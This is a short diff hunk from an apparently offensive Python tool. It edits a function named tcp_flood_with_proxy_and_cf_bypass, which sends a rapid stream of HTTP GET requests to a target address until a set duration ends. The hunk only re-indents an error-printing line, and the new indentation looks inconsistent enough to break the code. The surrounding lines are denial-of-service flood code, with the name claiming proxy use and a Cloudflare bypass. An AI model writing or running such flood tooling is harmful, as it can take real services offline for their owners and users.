@@ -100,7 +100,7 @@ def tcp_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
  s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
  s.close()
  except Exception as e:
- print(f"TCP Flood Error: {e}")
+                       print(f"TCP Flood Error: {e}")
  duration -= 1
  time.sleep(1 / requests_per_second)
 
